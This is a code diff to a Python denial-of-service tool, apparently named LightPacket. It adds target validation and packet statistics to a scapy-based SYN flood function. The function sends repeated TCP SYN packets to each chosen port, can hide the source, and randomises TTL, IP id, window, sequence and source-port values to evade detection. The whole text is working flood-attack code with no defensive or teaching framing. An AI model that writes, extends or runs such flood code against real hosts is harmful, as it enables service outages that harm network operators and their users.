@@ -18,8 +18,14 @@
 from scapy.layers.inet import IP, TCP
 from scapy.all import send
 from LightMirage import mirage
+from LightPacket.utils.CIDR import TargetParser
 
-def syn_flood_attack(target,ports,count,hidesrc=False):
+def syn_flood_attack(target,ports,count,hidesrc=False,stats=None):
+    valid = TargetParser.validate_target(target)
+    if valid == False:
+        print("[!] Target is not valid\n")
+        exit(0)
+
     for port in ports:
         for i in range(count):
             if hidesrc:
@@ -29,6 +35,10 @@ def syn_flood_attack(target,ports,count,hidesrc=False):
                 packet = IP(dst=target, ttl=mirage.ipv4_ttl(), id=mirage.ipv4_id(),flags=mirage.ipv4_flags()) / TCP(
                     dport=port, flags="S", options=mirage.Stealth_tcp_options(), window=mirage.tcp_window(),seq=mirage.tcp_seq(), sport=mirage.tcp_sport())
             send(packet,verbose=False)
+
+            if stats:
+                stats.packets_sent += 1
+                stats.bytes_sent += len(packet.build())
 
 
 
